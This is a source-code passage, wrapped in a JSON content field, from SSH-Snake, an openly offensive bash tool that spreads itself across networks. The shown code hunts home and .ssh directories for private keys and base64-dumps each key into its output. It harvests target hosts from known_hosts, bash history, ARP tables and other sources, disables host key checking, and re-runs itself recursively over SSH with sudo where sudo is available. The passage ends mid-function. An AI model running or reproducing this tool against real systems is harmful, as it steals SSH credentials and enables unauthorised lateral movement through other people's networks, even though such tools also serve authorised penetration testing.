          "content": "export THIS_SCRIPT=$(cat <<\"MAIN_SCRIPT\"\nignore_user=0\nuse_sudo=1\nssh_timeout=3\nretry_count=3\nignored_users=()\nignored_hosts=()\nignored_dests=()\nignored_key_files=(\"*badcert.pem*\" \"*badkey.pem*\")\ncustom_cmds=()\nscan_paths=()\nscan_paths_depth=3\nuse_find_from_hosts=1\nuse_find_arp_neighbours=1\nuse_find_d_block=0\nuse_find_from_authorized_keys=1\nuse_find_from_last=1\nuse_find_from_prev_dest=1\nuse_find_from_known_hosts=1\nuse_find_from_hashed_known_hosts=0\nuse_find_from_ignore_list=0\nuse_retry_all_dests=1\nuse_find_from_bash_history=1\nuse_find_from_ssh_config=1\ninteresting_users=(\"$USER\" \"root\")\ninteresting_hosts=(\"127.0.0.1\")\ninteresting_dests=()\nuse_combinate_interesting_users_hosts=1\nuse_combinate_users_hosts_aggressive=0\nexport LC_ALL=\"C\"\nexport PATH=\"$PATH:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/bin\"\ndeclare -A priv_keys\ndeclare -A key_files\ndeclare -A home_folders\ndeclare -A ssh_files\ndeclare -A priv_keys_files\ndeclare -A root_ssh_keys\ndeclare -A root_ssh_hostnames_dests\ndeclare -A root_ssh_hosts_dests\ndeclare -A ssh_users\ndeclare -A ssh_hosts\ndeclare -A ssh_dests\ndeclare -A _ignored_users\ndeclare -A _ignored_hosts\ndeclare -A _ignored_dests\ndeclare -A _ignored_key_files\ndeclare -A files\ndeclare -A not_files\ndeclare -A folders\ndeclare -A not_folders\ndeclare -A current_ips\ndeclare -A ignore_list_array\n_ignored_hosts[\"openssh.com\"]=1\n_ignored_hosts[\"255.255.255.255\"]=1\nignore_separator=\"|\"\nssh_options=(-oControlPath=none -oIdentitiesOnly=yes -oServerAliveInterval=300 -oTCPKeepAlive=no -oConnectTimeout=\"$ssh_timeout\" -oStrictHostKeyChecking=no -oGlobalKnownHostsFile=/dev/null -oUserKnownHostsFile=/dev/null -oBatchMode=yes)\nuser=\"$USER\"\nscript=\"$1\"\nhosts_chain=\"$(printf \"%s\" \"$2\" | base64 -d)\"\nhostnames_chain=\"$(printf \"%s\" \"$5\" | base64 -d)\"\nignore_list=\"$3\"\nthis_dest=\"$4\"\nthis_host=\"${this_dest#*@}\"\ncurrent_hostnames_ip=\"\"\nsshkeygen=(\"ssh-keygen\" \"-E\" \"md5\" \"-l\" \"-f\")\nindent=\"\"\ns=\"\"\nallowed_host_chars='[a-zA-Z0-9_.-]'\nallowed_users_chars='[a-z_][a-z0-9_-]{0,31}'\nprint_snake() {\ncat << \"EOF\"\n                      __    __    __    __\n                     /  \\  /  \\  /  \\  /  \\\n____________________/  __\\/  __\\/  __\\/  __\\_______________________________,\n___________________/  /__/  /__/  /__/  /__________________________________|\n                   | / \\   / \\   / \\   / \\  \\____                          |\n                   |/   \\_/   \\_/   \\_/   \\    o \\                         |\n                                           \\_____/--<                      |\n       ---_ ......._-_--.                                                  |\n      (|\\ /      / /| \\  \\                                      ?          |\n      /  /     .'  -=-'   `.                                  .            |\n     /  /    .'             )                                '             |\n   _/  /   .'        _.)   /                  _ -- ~~~ -- _      _______   |\n  / o   o        _.-' /  .'               .-~               ~-.{__-----. : |\n  \\          _.-'    / .'*|             /                       \\      | | |\n   \\______.-'//    .'.' \\*|            :         O     O         :     | | |\n    \\|  \\ | //   .'.' _ |*|            /\\                       /------' j |\n     `   \\|//  .'.'_ _ _|*|           { {/~-.               .-~\\~~~~~~~~~  |\n      .  .// .'.' | _ _ \\*|            \\/ /  |~:- .___. -.~\\  \\ \\          |\n      \\`-|\\_/ /    \\ _ _ \\*\\          / /\\ \\ | | { { \\ \\  } }  \\ \\         |\n       `/'\\__/      \\ _ _ \\*\\        { {   \\ \\ |  \\ \\  \\ \\ /    } }        |\n      /^|            \\ _ _ \\*         \\ \\   /\\ \\   \\ \\  /\\ \\   { {         |\n     '  `             \\ _ _ \\          } } { { \\ \\  \\ \\/ / \\ \\  \\ \\        |\n                       \\_             / /   } }  \\ \\ }{ {    \\ \\ } }       |\n ___________________________         / /   { {     \\ \\{\\ \\    } { {        |\n( Written for the mediocre. )       / /     } }     } }\\\\ \\  / / \\ \\       |\n(          By the mediocre. )      `-'     { {     `-'\\ \\`-'/ /   `-'      |\n----------------------------               `-'        `-' `-'              |\n                ^__^   o                                                   |\n        _______\\)xx(  o      <https://github.com/MegaManSec/SSH-Snake>     |\n    \\/\\)       \\)__(      By Joshua Rogers <https://joshua.hu/>            |\n       | w----||  U                                                        |\n       ||     ||                                  GPL 3, of course.        |\n________________________~_____/^,___,-^\\_________________~~_______________/`\nEOF\n}\nprint_settings() {\nlocal setting_keys\nlocal setting_values\nlocal max_key_length\nlocal max_value_length\nlocal i\nsetting_keys=(\"ignore_user\" \"use_sudo\" \"ssh_timeout\" \"retry_count\" \"scan_paths\" \"scan_paths_depth\" \"interesting_users\" \"interesting_hosts\" \"interesting_dests\" \"ignored_users\" \"ignored_hosts\" \"ignored_dests\" \"ignored_key_files\" \"custom_cmds\" \"use_combinate_interesting_users_hosts\" \"use_combinate_users_hosts_aggressive\" \"use_find_from_hosts\" \"use_find_from_last\" \"use_find_from_authorized_keys\" \"use_find_from_known_hosts\" \"use_find_from_ssh_config\" \"use_find_from_bash_history\" \"use_find_arp_neighbours\" \"use_find_d_block\" \"use_find_from_hashed_known_hosts\" \"use_find_from_prev_dest\" \"use_find_from_ignore_list\" \"use_retry_all_dests\")\nsetting_values=(\"$ignore_user\" \"$use_sudo\" \"$ssh_timeout\" \"$retry_count\" \"${scan_paths[*]}\" \"$scan_paths_depth\" \"${interesting_users[*]}\" \"${interesting_hosts[*]}\" \"${interesting_dests[*]}\" \"${ignored_users[*]}\" \"${ignored_hosts[*]}\" \"${ignored_dests[*]}\" \"${ignored_key_files[*]}\" \"${custom_cmds[*]}\" \"$use_combinate_interesting_users_hosts\" \"$use_combinate_users_hosts_aggressive\" \"$use_find_from_hosts\" \"$use_find_from_last\" \"$use_find_from_authorized_keys\" \"$use_find_from_known_hosts\" \"$use_find_from_ssh_config\" \"$use_find_from_bash_history\" \"$use_find_arp_neighbours\" \"$use_find_d_block\" \"$use_find_from_hashed_known_hosts\" \"$use_find_from_prev_dest\" \"$use_find_from_ignore_list\" \"$use_retry_all_dests\")\nmax_key_length=0\nmax_value_length=0\nfor ((i=0; i<${#setting_keys[@]}; i++)); do\nkey_length=\"${#setting_keys[$i]}\"\nvalue_length=\"${#setting_values[$i]}\"\n((key_length > max_key_length)) && max_key_length=$key_length\n((value_length > max_value_length)) && max_value_length=$value_length\ndone\nprintf \"|%-*s|%-*s|\\n\" \"$((max_key_length + 2))\" \"$(printf -- '-%.0s' $(seq \"$((max_key_length + 4))\"))\" \"$((max_value_length + 2))\" \"$(printf -- '-%.0s' $(seq \"$((max_value_length + 4))\"))\"\nprintf \"| %-*s | %-*s |\\n\" \"$((max_key_length + 2))\" \"Setting\" \"$((max_value_length + 2))\" \"Value\"\nprintf \"|%-*s|%-*s|\\n\" \"$((max_key_length + 2))\" \"$(printf -- '-%.0s' $(seq \"$((max_key_length + 4))\"))\" \"$((max_value_length + 2))\" \"$(printf -- '-%.0s' $(seq \"$((max_value_length + 4))\"))\"\nfor ((i=0; i<${#setting_keys[@]}; i++)); do\nprintf \"| %-*s | %-*s |\\n\" \"$((max_key_length + 2))\" \"${setting_keys[$i]}\" \"$((max_value_length + 2))\" \"${setting_values[$i]}\"\ndone\nprintf \"|%-*s|%-*s|\\n\\n\\n\" \"$((max_key_length + 2))\" \"$(printf -- '-%.0s' $(seq \"$((max_key_length + 4))\"))\" \"$((max_value_length + 2))\" \"$(printf -- '-%.0s' $(seq \"$((max_value_length + 4))\"))\"\n}\nremove_functions() {\nlocal this_script\nlocal function_names\nthis_script=\"$1\"\nfunction_names=\"$2\"\nprintf \"%s\" \"$this_script\" | awk -v fnames=\"$function_names\" '\nfunction is_func_line() {\nfor (i in funcs) {\nif ($0 ~ \"^\" funcs[i] \"\\\\(\\\\)\") {\nreturn 1\n }\n }\nreturn 0\n }\nfunction is_func_call() {\nfor (i in funcs) {\nif ($0 ~ \"^[ ]*\" funcs[i]) {\nreturn 1\n }\n }\nreturn 0\n }\nBEGIN {\nsplit(fnames, funcs, \" \");\nin_func = 0\n }\nis_func_line() { in_func = 1; next }\n/^\\}/ { if (in_func) { in_func = 0; next } }\nis_func_call() { next }\n!in_func { print }\n'\n}\ngen_retried_interesting_dests() {\nlocal ssh_dest\nfor ssh_dest in \"${!root_ssh_hostnames_dests[@]}\"; do\nprintf \"%s\" \"$ssh_dest\" | awk -F'[@():]' -v OFS='@' '\n{\nuser = $1\nfor (i = 2; i <= NF; i++) {\nif ($i != \"\" && user != \"\") {\nprint \"\\\\x22\" user \"@\" $i \"\\\\x22\"\n }\n }\n }'\ndone\nfor ssh_dest in \"${!root_ssh_hosts_dests[@]}\"; do\nprintf \"\\\\\\x22%s\\\\\\x22\\n\" \"$ssh_dest\"\ndone\n}\nshape_script() {\nlocal line\nlocal local_script\nlocal opt_function_list\nlocal opt_function\nlocal ssh_dest\nopt_function_list=(\"use_combinate_interesting_users_hosts\" \"use_combinate_users_hosts_aggressive\" \"use_find_from_hosts\" \"use_find_from_last\" \"use_find_from_authorized_keys\" \"use_find_from_known_hosts\" \"use_find_from_ssh_config\" \"use_find_from_bash_history\" \"use_find_arp_neighbours\" \"use_find_d_block\" \"use_find_from_hashed_known_hosts\" \"use_find_from_prev_dest\" \"use_find_from_ignore_list\" \"use_retry_all_dests\")\nfor opt_function in \"${opt_function_list[@]}\"; do\nif [[ ${!opt_function} -eq 0 ]]; then\nremove_function+=\"${opt_function#use_} \"\nfi\n[[ \"$opt_function\" =~ use_find_from_ignore_list|use_retry_all_dests ]] && continue\nremove_function+=\"$opt_function \"\ndone\nif [[ ${#custom_cmds[@]} -eq 0 ]]; then\nremove_function+=\"exec_custom_cmds \"\nremove_function+=\"custom_cmds \"\nfi\nif [[ ${#scan_paths[@]} -eq 0 || $scan_paths_depth -lt 1 ]]; then\nremove_function+=\"find_ssh_keys_paths \"\nremove_function+=\"scan_paths \"\nremove_function+=\"scan_paths_depth \"\nfi\nif [[ ${#ignored_users[@]} -eq 0 && ${#ignored_hosts[@]} -eq 0 && ${#ignored_dests[@]} -eq 0 ]]; then\nremove_function+=\"init_ignored \"\nremove_function+=\"ignored_users ignored_hosts ignored_dests \"\nfi\nif [[ $use_combinate_users_hosts_aggressive -eq 0 ]] && [[ ${#interesting_users[@]} -eq 0 || $use_combinate_interesting_users_hosts -eq 0 ]]; then\nremove_function+=\"find_from_hosts find_arp_neighbours find_d_block \"\nfi\nif [[ $use_find_from_authorized_keys -eq 0 && $use_find_from_known_hosts -eq 0 && $use_find_from_hashed_known_hosts -eq 0 ]]; then\nremove_function+=\"find_user_from_file \"\nfi\nif [[ $use_combinate_users_hosts_aggressive -eq 1 ]]; then\nremove_function+=\"use_combinate_interesting_users_hosts combinate_interesting_users_hosts \"\nfi\nif [[ $use_combinate_interesting_users_hosts -eq 0 && $use_combinate_users_hosts_aggressive -eq 0 ]]; then\nremove_function+=\"interesting_hosts interesting_users \"\nif [[ $use_retry_all_dests -eq 0 ]]; then\nremove_function+=\"interesting_dests \"\nfi\nfi\nif [[ ${#interesting_users[@]} -eq 0 && ${#interesting_hosts[@]} -eq 0 && ${#interesting_dests[@]} -eq 0 ]]; then\nif [[ $use_retry_all_dests -eq 0 ]]; then\nremove_function+=\"interesting_dests \"\nfi\nremove_function+=\"combinate_interesting_users_hosts use_combinate_interesting_users_hosts \"\nremove_function+=\"interesting_users interesting_hosts \"\nfi\nif [[ $use_find_from_ignore_list -eq 0 ]]; then\nremove_function+=\"use_find_from_ignore_list \"\nfi\nif [[ $use_retry_all_dests -eq 0 ]]; then\nremove_function+=\"use_retry_all_dests \"\nfi\nif [[ $use_sudo -eq 0 ]]; then\nremove_function+=\"check_sudo use_sudo s= \"\nfi\nif [[ ${#ignored_key_files[@]} -eq 0 ]]; then\nremove_function+=\"ignored_key_files \"\nfi\nremove_function+=\"shape_script \"\nremove_function+=\"fin_root \"\nremove_function+=\"print_settings \"\nremove_function+=\"remove_functions \"\nremove_function+=\"print_snake \"\nremove_function+=\"gen_retried_interesting_dests \"\nremove_function+=\"root_ssh_keys root_ssh_hostnames_dests root_ssh_hosts_dests\"\nlocal_script=\"$(remove_functions \"$THIS_SCRIPT\" \"$remove_function\")\"\nlocal_script=\"$(printf \"%s\" \"$local_script\" | sed -e 's/^[ ]*//' -e 's/^#.*$//' -e 's/[ ]#.*//' -e '/^[ ]*$/d')\"\nwhile IFS= read -r line; do\nif [[ \"$line\" == *\"EXTERNAL_MSG: KEY\"* ]]; then\nroot_ssh_keys[\"${line##* }\"]=1\nelif [[ \"$line\" =~ ($allowed_users_chars@\\([0-9\\.:]*\\))$ ]]; then\nroot_ssh_hostnames_dests[\"${BASH_REMATCH[1]}\"]=1\nelif [[ \"$line\" =~ ($allowed_users_chars@[0-9\\.]*)$ ]]; then\nroot_ssh_hosts_dests[\"${BASH_REMATCH[1]}\"]=1\nfi\nprintf \"[%s]\" \"$(date +%s)\"\nprintf \"%s\\n\" \"$line\"\ndone < <(echo 'printf \"%s\" \"$1\" | base64 -d | bash --noprofile --norc -s $1' | bash --noprofile --norc -s \"$(printf \"%s\" \"$local_script\" | base64 | tr -d '\\n')\" 2>&1 | grep -v -F 'INTERNAL_MSG')\n[[ $use_retry_all_dests -eq 1 ]] || return\nlocal retried_interesting_dests\nretried_interesting_dests=\"$(gen_retried_interesting_dests | sort | uniq)\"\n[[ \"${#retried_interesting_dests}\" -gt 0 ]] || return\nprintf \"\\n\\n---------------------------------------\\n\\n\"\nprintf \"use_retry_all_dests=1. Re-starting.\\n\"\nprintf \"%s destinations (from %s unique servers) added to interesting_dests.\\n\" \"$(echo \"$retried_interesting_dests\" | wc -l)\" \"${#root_ssh_hostnames_dests[@]}\"\nretried_interesting_dests=\"$(echo \"$retried_interesting_dests\" | tr '\\n' ' ')\"\nprintf \"\\n---------------------------------------\\n\\n\\n\"\nlocal_script=\"$(printf \"%s\" \"$local_script\" | sed 's/^interesting_dests=(/interesting_dests=('\"$retried_interesting_dests\"'/')\"\nlocal_script=\"$(printf \"%s\" \"$local_script\" | sed 's/^use_retry_all_dests=1/use_retry_all_dests=2/')\"\nremove_function=\"find_from_authorized_keys find_from_hosts find_from_last find_arp_neighbours find_d_block find_from_ignore_list find_from_known_hosts find_from_hashed_known_hosts find_from_prev_dest combinate_users_hosts_aggressive combinate_interesting_users_hosts interesting_users interesting_hosts deduplicate_resolved_hosts_keys init_ignored ignored_users ignored_hosts ignored_dests find_user_from_file \"\nlocal_script=\"$(remove_functions \"$local_script\" \"$remove_function\")\"\nwhile IFS= read -r line; do\nif [[ \"$line\" == *\"EXTERNAL_MSG: KEY\"* ]]; then\nroot_ssh_keys[\"${line##* }\"]=1\nelif [[ \"$line\" =~ ($allowed_users_chars@\\([0-9\\.:]*\\))$ ]]; then\nroot_ssh_hostnames_dests[\"${BASH_REMATCH[1]}\"]=1\nelif [[ \"$line\" =~ ($allowed_users_chars@[0-9\\.]*)$ ]]; then\nroot_ssh_hosts_dests[\"${BASH_REMATCH[1]}\"]=1\nfi\nprintf \"[%s]\" \"$(date +%s)\"\nprintf \"%s\\n\" \"$line\"\ndone < <(echo 'printf \"%s\" \"$1\" | base64 -d | bash --noprofile --norc -s $1' | bash --noprofile --norc -s \"$(printf \"%s\" \"$local_script\" | base64 | tr -d '\\n')\" 2>&1 | grep -v -F 'INTERNAL_MSG')\n}\nfin_root() {\nlocal root_ssh_dest\ndeclare -A root_ssh_hosts\nfor root_ssh_dest in \"${!root_ssh_hostnames_dests[@]}\"; do\nroot_ssh_hosts[\"${root_ssh_dest#*@}\"]=1\ndone\nprintf \"\\n\\n\\n\"\ncat <<\"EOF\"\n               ______\n          _.-\"\"      \"\"-._\n       .-'                `-.\n     .'      __.----.__      `.\n    /     .-\"          \"-.     \\\n   /    .'                `.    \\\n  J    /                    \\    L\n  F   J                      L   J\n J    F                      J    L\n |   J                        L   |\n |   |                        |   |\n |   J                        F   |\n J    L                      J    F\n  L   J   .-\"\"\"\"-.           F   J\n  J    \\ /        \\   __    /    F\n   \\    (|)(|)_   .-'\".'  .'    /\n    \\    \\   /_>-'  .<_.-'     /\n     `.   `-'     .'         .'\n       `--.|___.-'`._    _.-'\n           ^         \"\"\"\"\n\n           ..             ..\n          ( '`<          ( '`<  ...Summary Report:\n           )(             )(\n    ( ----'  '.    ( ----'  '.\n    (         ;    (         ;\n     (_______,'     (_______,'\n~^~^~^~^~^~^~^~^~^~^~~^~^~^~^~^~^~^~^~^~^~~^~^~^~^~^\nEOF\nprintf \"Unique private keys discovered: %s\\n\" \"${#root_ssh_keys[@]}\"\nprintf \"Unique shell accounts accessed: %s\\n\" \"${#root_ssh_hostnames_dests[@]}\"\nprintf \"Unique systems accessed: %s\\n\" \"${#root_ssh_hosts[@]}\"\nprintf \"\\nNeed a list of servers accessed? Run one of these commands:\\n\\n\"\ncat <<\"EOF\"\ngrep -oE \"[a-z_][a-z0-9_-]{0,31}@[0-9\\.]*$\" output.log  | sort | uniq\ngrep -oE \"[a-z_][a-z0-9_-]{0,31}@\\([0-9\\.:]*\\)$\" output.log  | sort | uniq\nEOF\nprintf -- \"-- https://joshua.hu/ --\\n\"\nprintf -- \"-- https://github.com/MegaManSec/SSH-Snake --\\n\"\nprintf \"\\nThanks for playing!\\n\"\n}\ncheck_commands() {\nlocal required_commands\nlocal required_command\nrequired_commands=(\"ssh-keygen\" \"readlink\" \"ssh\" \"basename\" \"base64\" \"awk\" \"sort\" \"uniq\" \"grep\" \"tr\" \"find\" \"cat\")\nfor required_command in \"${required_commands[@]}\"; do\nif ! command -v \"$required_command\" >/dev/null 2>&1; then\necho \"$required_command\"\nreturn\nfi\ndone\nif [[ \"${BASH_VERSINFO:-0}\" -lt 4 ]]; then\necho \"bash\"\nreturn\nfi\n}\ncheck_startup() {\nlocal missing_command\nmissing_command=\"$(check_commands)\"\nif [[ -z \"$script\" ]]; then\nif ! command -v sed >/dev/null 2>&1; then\nprintf \"Could not begin because 'sed' is not available!\\n\"\nexit 1\nelif [[ -n \"$missing_command\" ]]; then\nprintf \"Could not begin because %s is not available!\\n\" \"$missing_command\"\nexit 1\nfi\nprint_snake\nprint_settings\nshape_script\nfin_root\nexit 0\nfi\nif [[ -n \"$missing_command\" ]]; then\nprintf \"INTERNAL_MSG: command not found: %s\\n\" \"$required_command\"\nexit 1\nfi\nif ! printf \"%s\" \"$script\" | base64 -d >/dev/null 2>&1; then\nprintf \"Usage: bash %s >output.log\\n\" \"$0\"\nexit 1\nfi\n}\nfin() {\nprintf \"INTERNAL_MSG: ignore list: %s%s@%s%s\\n\" \"$ignore_separator\" \"$user\" \"$current_hostnames_ip\" \"$ignore_separator\"\nexit 0\n}\ncheck_sudo() {\n[[ $use_sudo -eq 1 ]] && sudo -n true >/dev/null 2>&1 && s=\"sudo\"\n}\ncheck_sshkeygen() {\n[[ \"$(ssh-keygen -E 2>&1)\" == *\"unknown option\"* ]] && sshkeygen=(\"ssh-keygen\" \"-l\" \"-f\")\n}\ncheck_ssh_options() {\nlocal ssh_extra_options\nlocal ssh_extra_option\nssh_extra_options=(-oHostkeyAlgorithms=+ssh-rsa -oKexAlgorithms=+diffie-hellman-group1-sha1)\nfor ssh_extra_option in \"${ssh_extra_options[@]}\"; do\n[[ \"$(ssh \"$ssh_extra_option\" 2>&1)\" =~ Bad\\ protocol\\ 2\\ host\\ key\\ algorithms|Bad\\ SSH2\\ KexAlgorithms|Bad\\ key\\ types|diffie-hellman-group1-sha1|ssh-rsa ]] || ssh_options+=(\"$ssh_extra_option\")\ndone\nssh_extra_option=\"-oPubkeyAcceptedKeyTypes=+ssh-rsa\"\n[[ \"$(ssh \"$ssh_extra_option\" 2>&1)\" =~ Bad\\ configuration\\ option|pubkeyacceptedkeytypes ]] || ssh_options+=(\"$ssh_extra_option\")\n}\ninit_current_ips() {\nlocal current_ip\nlocal default_route\nlocal default_ip\nlocal iface\nwhile IFS= read -r current_ip; do\ncurrent_ips[\"$current_ip\"]=1\ndone < <(${s} hostname -I 2>/dev/null | tr ' ' '\\n' | grep -F '.')\nwhile IFS= read -r iface; do\nwhile IFS= read -r current_ip; do\ncurrent_ips[\"$current_ip\"]=1\ndone < <(${s} ipconfig getifaddr \"$iface\" 2>/dev/null)\ndone < <(${s} ifconfig -l 2>/dev/null | tr ' ' '\\n')\ncurrent_hostnames_ip=\"$(IFS=:; echo \"${!current_ips[*]}\")\"\nif ip route show default >/dev/null 2>&1; then\ndefault_route=\"$(${s} ip route show default 2>/dev/null | awk '/default via/{print $3; exit}')\"\ndefault_route=\"${default_route:-\"1.1.1.1\"}\"\ndefault_ip=\"$(${s} ip route get \"$default_route\" 2>/dev/null | awk -F'src' '{print $NF; exit}' | awk '{print $1}')\"\nelif route -n get 1.1.1.1 >/dev/null 2>&1; then\niface=\"$(${s} route -n get 1.1.1.1 2>/dev/null | awk '/interface: / {print $2;exit}')\"\ndefault_ip=\"$(${s} ipconfig getifaddr \"$iface\" 2>/dev/null)\"\nfi\ndefault_ip=\"${default_ip:-\"???\"}\"\nthis_host=\"${this_host:-\"$default_ip\"}\"\n[[ ${#current_ips[@]} -eq 0 ]] && current_ips[\"$this_host\"]=1 && current_hostnames_ip=\"$this_host\"\n}\ninit_chains() {\nhosts_chain=\"$hosts_chain${hosts_chain:+->}$user@$this_host\"\nhostnames_chain=\"$hostnames_chain${hostnames_chain:+->}$user@($current_hostnames_ip)\"\n}\ninit_indent() {\nlocal recursive_indent_length\nlocal temp_chain\nlocal pattern\npattern=']->'\ntemp_chain=\"$hosts_chain\"\nrecursive_indent_length=0\nwhile [[ \"$temp_chain\" == *\"$pattern\"* ]]; do\n((recursive_indent_length++))\ntemp_chain=\"${temp_chain#*\"$pattern\"}\"\ndone\nindent=\"$(printf \"%*s\" $recursive_indent_length \"\")\"\n}\nchained_print() {\nprintf \"%s%s%s\\n\" \"$indent\" \"$hosts_chain\" \"$1\"\n}\ninit_ignored() {\nlocal ignored_user\nlocal ignored_host\nlocal ignored_dest\nlocal current_ip\nfor ignored_user in \"${ignored_users[@]}\"; do\nis_ssh_user \"$ignored_user\" && _ignored_users[\"$ignored_user\"]=1\n[[ \"$ignored_user\" == \"$user\" ]] && fin\ndone\nfor ignored_host in \"${ignored_hosts[@]}\"; do\nis_ssh_host \"$ignored_host\" && _ignored_hosts[\"$ignored_host\"]=1\n[[ -v 'current_ips[\"$ignored_host\"]' || ${#current_ips[\"$ignored_host\"]} -gt 0 ]] && fin\ndone\nfor ignored_dest in \"${ignored_dests[@]}\"; do\nis_ssh_dest \"$ignored_dest\" && _ignored_dests[\"$ignored_dest\"]=1\nfor current_ip in \"${!current_ips[@]}\"; do\n[[ \"$ignored_dest\" == \"$user@$current_ip\" ]] && fin\ndone\ndone\n}\nload_ignore_list_array() {\nlocal line\nwhile IFS= read -r line; do\nignore_list_array[\"$line\"]=1\ndone < <(echo \"$ignore_list\" | tr '|' '\\n'  | awk -F'[@:]' -v OFS='@' '\n{\nuser = $1\nfor (i = 2; i <= NF; i++) {\nif ($i != \"\" && user != \"\") {\nprint user \"@\" $i\n}\n}\n}'\n)\n}\ncheck_for_recursion() {\n[[ $ignore_user -eq 1 ]] && [[ \"$ignore_list\" == *\"@$current_hostnames_ip$ignore_separator\"* ]] && fin\n[[ \"$ignore_list\" == *\"$ignore_separator$user@$current_hostnames_ip$ignore_separator\"* ]] && fin\nignore_list+=\"$ignore_separator$user@$current_hostnames_ip$ignore_separator\"\nload_ignore_list_array\n}\nsetup() {\ncheck_startup\ncheck_sudo\ncheck_sshkeygen\ncheck_ssh_options\ninit_current_ips\ninit_chains\ninit_indent\nchained_print \"\"\nprintf \"%s%s\\n\" \"$indent\" \"$hostnames_chain\"\ninit_ignored\ncheck_for_recursion\n}\nretry_all_dests() {\nlocal current_ip\nlocal ssh_dest\n[[ $use_retry_all_dests -eq 2 ]] || return\nfor current_ip in \"${!current_ips[@]}\"; do\nif [[ \" ${interesting_dests[*]} \" != *\" $user@$current_ip \"* ]]; then\nreturn\nfi\ndone\nadd_ssh_dest() { :; }\nadd_ssh_host() { :; }\nadd_ssh_user() { :; }\nfor ssh_dest in \"${interesting_dests[@]}\"; do\nis_ssh_dest \"$ssh_dest\" && ssh_dests[\"$ssh_dest\"]=1\ndone\n}\nexec_custom_cmds() {\nlocal cmd\nfor cmd in \"${custom_cmds[@]}\"; do\nlocal output\noutput=\"$(eval \"$cmd\" 2>&1| base64 | tr -d '\\n')\"\nchained_print \": EXTERNAL_MSG: CMD[$cmd]: $output\"\ndone\n}\nfind_home_folders() {\nlocal home_folder\nwhile IFS= read -r home_folder; do\n[[ -v 'home_folders[\"$home_folder\"]' || ${#home_folders[\"$home_folder\"]} -gt 0 ]] && continue\nhome_folder=\"$(readlink -f -- \"$home_folder\" 2>/dev/null)\"\nis_dir \"$home_folder\" && home_folders[\"$home_folder\"]=1\ndone < <(${s} find -L \"/home\" \"/Users\" -mindepth 1 -maxdepth 1 -type d 2>/dev/null)\nwhile IFS=: read -r _ _ _ _ _ home_folder _; do\n[[ -v 'home_folders[\"$home_folder\"]' || ${#home_folders[\"$home_folder\"]} -gt 0 ]] && continue\nhome_folder=\"$(readlink -f -- \"$home_folder\" 2>/dev/null)\"\nis_dir \"$home_folder\" && home_folders[\"$home_folder\"]=1\ndone < <(getent passwd 2>/dev/null)\n}\ninit_ssh_files() {\nlocal home_folder\nfor home_folder in \"${!home_folders[@]}\"; do\nlocal ssh_folder\nlocal ssh_file\nssh_folder=\"$home_folder/.ssh\"\nis_dir \"$ssh_folder\" || continue\nwhile IFS= read -r ssh_file; do\nis_file \"$ssh_file\" || continue\nssh_files[\"$ssh_file\"]=1\ndone < <(${s} find -L \"$ssh_folder\" -type f 2>/dev/null)\ndone\n}\ncheck_file_for_privkey() {\nlocal known_key_headers\nlocal key_file\nlocal key_header\nlocal file_header\nkey_file=\"$1\"\nknown_key_headers=(\n\"SSH PRIVATE KEY FILE FORMAT 1.1\"\n\"-----BEGIN RSA PRIVATE KEY-----\"\n\"-----BEGIN DSA PRIVATE KEY-----\"\n\"-----BEGIN EC PRIVATE KEY-----\"\n\"-----BEGIN OPENSSH PRIVATE KEY-----\"\n\"-----BEGIN PRIVATE KEY-----\"\n\"-----BEGIN ENCRYPTED PRIVATE KEY-----\"\n\"---- BEGIN SSH2 ENCRYPTED PRIVATE KEY ----\"\n)\nis_file \"$key_file\" || return 1\nread -r -n 50 file_header < <(${s} cat -- \"$key_file\" 2>/dev/null)\nfor key_header in \"${known_key_headers[@]}\"; do\nif [[ \"$file_header\" == *\"$key_header\"* ]]; then\nreturn 0\nfi\ndone\nreturn 1\n}\npopulate_keys() {\nlocal ssh_pubkey\nlocal ssh_pubkey_ret\nlocal key_file\nkey_file=\"$1\"\nssh_pubkey=\"$(${s} ssh-keygen -P NOT_VALID4SURE -yf \"$key_file\" 2>&1)\"\nssh_pubkey_ret=$?\nif [[ \"$ssh_pubkey\" == *\"invalid format\"* || \"$ssh_pubkey\" == *\"No such file or directory\"* ]]; then\nreturn 1\nfi\nif [[ $ssh_pubkey_ret -eq 0 ]]; then\nchained_print \": Discovered usable private key in [$key_file]\"\npriv_keys[\"$ssh_pubkey\"]=\"$key_file\"\nelse\nchained_print \": Discovered unusable private key in [$key_file]\"\nfi\nchained_print \": EXTERNAL_MSG: KEY[$key_file]: $(${s} cat -- \"$key_file\" 2>/dev/null | base64 | tr -d '\\n')\"\nreturn 0\n}\ncheck_and_populate_keys() {\nlocal unresolved_key_file\nlocal key_file\nlocal ignored_key_file\nunresolved_key_file=\"$1\"\n[[ -z \"$unresolved_key_file\" ]] && return 1\n[[ -v 'priv_keys_files[\"$unresolved_key_file\"]' || ${#priv_keys_files[\"$unresolved_key_file\"]} -gt 0 ]] && return 0\n[[ -v 'key_files[\"$unresolved_key_file\"]' || ${#key_files[\"$unresolved_key_file\"]} -gt 0 ]] && return 1\nkey_file=\"$(${s} readlink -f -- \"$unresolved_key_file\" 2>/dev/null)\"\n[[ -z \"$key_file\" ]] && key_files[\"$unresolved_key_file\"]=1 && return 1\n[[ -v 'priv_keys_files[\"$key_file\"]' || ${#priv_keys_files[\"$key_file\"]} -gt 0 ]] && priv_keys_files[\"$unresolved_key_file\"]=1 && return 0\n[[ -v 'key_files[\"$key_file\"]' || ${#key_files[\"$key_file\"]} -gt 0 ]] && key_files[\"$unresolved_key_file\"]=1 && return 1\nkey_files[\"$unresolved_key_file\"]=1\nkey_files[\"$key_file\"]=1\nfor ignored_key_file in \"${ignored_key_files[@]}\"; do\n[[ \"$key_file\" == $ignored_key_file ]] && return 1\ndone\nif check_file_for_privkey \"$key_file\"; then\npopulate_keys \"$key_file\" && priv_keys_files[\"$key_file\"]=1 && priv_keys_files[\"$unresolved_key_file\"]=1 && return 0\nfi\nreturn 1\n}\nfind_ssh_keys() {\nlocal ssh_file\nfor ssh_file in \"${!ssh_files[@]}\"; do\ncheck_and_populate_keys \"$ssh_file\"\ndone\n}\nfind_ssh_keys_paths() {\nlocal ssh_file\nwhile IFS= read -r ssh_file; do\ncheck_and_populate_keys \"$ssh_file\"\ndone < <(${s} find -L ${scan_paths[@]} -maxdepth \"$scan_paths_depth\" -type f -size +200c -size -14000c -exec grep -l -m 1 -E '^----[-| ]BEGIN .{0,15}PRIVATE KEY' {} + 2>/dev/null)\n}\ncheck_potential_key_files() {\nlocal key_file\nlocal home_folder\nlocal potential_key_file\nkey_file=\"$1\"\nhome_folder=\"$2\"\nfor potential_key_file in \"$key_file\" 